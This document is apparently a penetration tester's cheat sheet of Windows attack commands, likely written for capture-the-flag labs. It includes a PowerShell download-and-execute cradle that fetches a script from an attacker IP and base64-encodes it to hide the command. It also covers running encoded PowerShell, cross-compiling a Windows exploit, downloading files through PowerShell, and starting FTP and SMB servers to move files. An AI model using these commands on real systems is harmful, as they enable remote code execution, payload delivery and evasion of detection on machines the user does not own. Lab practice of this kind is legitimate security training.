# Convert Powershell Code into base64 Encoded UTF-16LE String
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

# Convert Powershell Code into base64 Encoded UTF-16LE String (Python)
from base64 import b64encode
b64encode('iex(command)'.encode('UTF-16LE'))

# Convert Powershell Code into base64 Encoded UTF-16LE String (Ruby)
require "base64"
Base64.encode64('iex(command)'.force_encoding('UTF-16LE'))

# Execute a powershell encoded command
powershell -ec "<Base64UTF16LEEncodedString>"

# Compile windows exploit in linux
i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe

# Compiling python scripts to executables
wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py

# Download a file from powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/afile.exe','C:\Users\YOURUSER\Desktop\afile.exe')"

# Open an FTP Server (from python)
pip install pyftpdlib
python -m pyftpdlib -p 21

# Open an FTP Server (from metasploit)
use auxiliary/server/ftp
auxiliary/server/tftp

# Open an SMB Server
python smbserver.py SHARENAME /dir
python smbserver.py SHARENAME $(pwd)
smbserver.py devel /root/Desktop/htb/devel 
On the client:
net use z: \\<serverIP>\<sharename>
or
copy filename \\<serverIP>\<sharename>
